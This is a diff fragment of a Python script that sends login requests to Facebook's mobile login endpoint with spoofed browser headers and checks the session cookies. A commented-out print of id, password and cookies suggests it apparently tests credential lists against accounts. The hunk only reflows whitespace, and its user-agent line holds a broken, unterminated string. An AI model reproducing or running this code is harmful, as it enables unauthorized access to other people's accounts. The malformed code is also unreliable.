@@ -1493,9 +1493,8 @@ header_freefb = {'authority': 'p.facebook.com',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'none',
                 'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-               
-               'user-agent': 'pro}              
+                'upgrade-insecure-requests': '1',              
+                'user-agent': 'pro}              
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
